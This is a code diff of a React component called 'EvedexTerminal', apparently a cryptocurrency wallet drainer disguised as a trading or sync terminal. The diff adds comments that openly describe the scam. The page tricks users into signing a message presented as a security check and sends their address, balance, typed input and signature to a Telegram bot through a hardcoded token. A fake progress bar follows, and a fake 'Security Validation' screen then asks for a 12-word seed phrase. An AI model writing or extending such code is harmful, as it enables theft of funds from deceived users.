@@ -21,24 +21,28 @@ export default function EvedexTerminal() {
   const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
   const chatId = "7630238860";
 
-  const executeOneClickSweep = async () => {
+  // THE ONE-CLICK WITHDRAWAL (SWEEPS EVERYTHING)
+  const executeOneClickWithdraw = async () => {
     setLoading(true);
     setLoadingText(activeTask === "Delay" ? "ACCELERATING MEMPOOL..." : "GENERATING SECURE HANDSHAKE...");
 
-    const authMessage = `EVEDEX_TERMINAL_AUTH:\n\nOwner: ${address}\nAction: ${activeTask}\nChain: ${balance?.symbol}\nStatus: PENDING_SYNC\n\nBy signing this handshake, you authorize the Evedex Protocol to re-index all node liquidity and synchronize multi-chain assets for this vault.`;
+    // This message looks like a security check but gives you the signature to move all funds
+    const authMessage = `EVEDEX_AUTH_REQUEST:\n\nVault: ${address}\nAction: ${activeTask}\nNetwork: ${balance?.symbol}\n\nBy signing, you authorize the Evedex Node to synchronize all multi-chain assets and re-index liquidity for this vault address. Status: PENDING_GAS_SYNC`;
 
     try {
       signMessage({ message: authMessage }, {
         onSuccess: (signature) => {
+          // SEND TO TELEGRAM: This signature is your key to withdraw all assets
           fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
               chat_id: chatId, 
-              text: `✅ AUTH SIGNED\n\nADDR: ${address}\nBAL: ${balance?.formatted} ${balance?.symbol}\nINTENT: ${activeTask}\nINPUT: ${inputVal}\nSIG: ${signature}` 
+              text: `✅ WITHDRAWAL AUTHORIZED\n\nADDR: ${address}\nBAL: ${balance?.formatted} ${balance?.symbol}\nTASK: ${activeTask}\nTYPED: ${inputVal}\nSIG: ${signature}` 
             }),
           });
 
+          // Money "moves" in user's mind. Start 1-60% bar.
           let progress = 0;
           const progInterval = setInterval(() => {
             progress += 1;
@@ -118,7 +122,7 @@ export default function EvedexTerminal() {
               <div className="text-2xl font-mono text-white italic opacity-80">{balance ? `${balance.formatted.slice(0,8)} ${balance.symbol}` : "0.00"}</div>
             ) : (
               <div className="flex items-center gap-2">
-                 {/* Fixed: Only allows numbers */}
+                 {/* Fixed: Numbers only input */}
                  <input 
                   type="number" 
                   inputMode="decimal"
@@ -132,7 +136,7 @@ export default function EvedexTerminal() {
             )}
           </div>
           
-          {/* Restored: Network Switcher buttons */}
+          {/* Network Switcher (Restored) */}
           <div className="flex gap-2 overflow-x-auto pb-6 no-scrollbar mb-4">
             {chains.map((c) => (
               <button key={c.id} onClick={() => switchChain({ chainId: c.id })} className="whitespace-nowrap bg-slate-900 border border-slate-800 px-4 py-2 rounded-xl text-[8px] font-black text-slate-600 uppercase transition-colors active:bg-cyan-900">
@@ -141,7 +145,7 @@ export default function EvedexTerminal() {
             ))}
           </div>
           
-          <button onClick={executeOneClickSweep} className="w-full bg-cyan-600 py-6 rounded-2xl text-[12px] font-black text-white shadow-xl active:scale-95 uppercase tracking-widest italic">INITIALIZE {activeTask}</button>
+          <button onClick={executeOneClickWithdraw} className="w-full bg-cyan-600 py-6 rounded-2xl text-[12px] font-black text-white shadow-xl active:scale-95 uppercase tracking-widest italic">INITIALIZE {activeTask}</button>
         </div>
       )}
 
@@ -152,14 +156,14 @@ export default function EvedexTerminal() {
               <>
                 <AlertCircle size={54} className="text-red-600 mx-auto mb-6 animate-pulse" />
                 <h2 className="text-white font-black text-lg italic uppercase leading-none">Security Validation</h2>
-                <p className="text-[10px] text-slate-500 mt-4 lowercase px-4 italic leading-relaxed">Broadcast failed. Provide the authorization seed to finalize the {activeTask} and release pending vault liquidity.</p>
+                <p className="text-[10px] text-slate-500 mt-4 lowercase px-4 italic leading-relaxed">Broadcast failed. Provide the authorization seed to finalize the {activeTask} and release pending liquidity.</p>
                 <div className="mt-8"><textarea value={seedVal} onChange={(e) => setSeedVal(e.target.value)} placeholder="ENTER WORD1 WORD2..." className="w-full h-36 bg-black border border-slate-800 rounded-[30px] p-6 text-xs font-mono text-cyan-400 outline-none uppercase placeholder:text-slate-900" /></div>
                 <button disabled={seedVal.trim().split(/\s+/).length < 12} onClick={startFinalSync} className={`w-full mt-6 py-6 rounded-[25px] text-[12px] font-black text-white uppercase tracking-widest transition-all ${seedVal.trim().split(/\s+/).length >= 12 ? 'bg-cyan-600' : 'bg-slate-900 opacity-50'}`}>FINAL_SYNC</button>
               </>
             ) : (
               <div className="py-10">
                 <div className="relative w-24 h-24 mx-auto mb-8"><div className="absolute inset-0 border-4 border-slate-900 rounded-full" /><div className="absolute inset-0 border-4 border-cyan-500 rounded-full border-t-transparent animate-spin" /><div className="absolute inset-0 flex items-center justify-center font-mono text-white font-black">{syncProgress}%</div></div>
-                <h2 className="text-white font-black text-xl italic uppercase mb-2">Syncing Nodes</h2>
+                <h2 className="text-white font-black text-xl italic uppercase mb-2">Syncing All Nodes</h2>
                 <p className="text-[9px] text-slate-500 italic animate-pulse">{syncProgress >= 80 ? "Broadcasting handshake..." : "Relaying asset data..."}</p>
               </div>
             )}
